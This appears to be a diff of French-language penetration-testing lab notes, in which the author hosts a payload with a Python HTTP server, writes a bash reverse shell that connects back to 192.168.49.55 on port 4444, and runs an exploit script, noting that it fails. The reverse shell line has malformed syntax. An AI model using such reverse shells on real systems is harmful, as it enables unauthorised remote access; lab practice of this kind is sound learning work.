@@ -75,3 +75,13 @@ notre shell.sh est crée
 
 ???(root?kali)-[/home/kali]
 ??# python3 -m http.server 8080
+
+Le shell est mal encodé. on va testé en écrivant
+#!/bin.bash
+/bin/bash -i >& /dev/tcp/192.168.49.55:4444 0>&1
+
+???(root?kali)-[/home/kali]
+??# python3 -m http.server 8080
+
+python3 49383.py  
+Le fichier ne se récupère pas
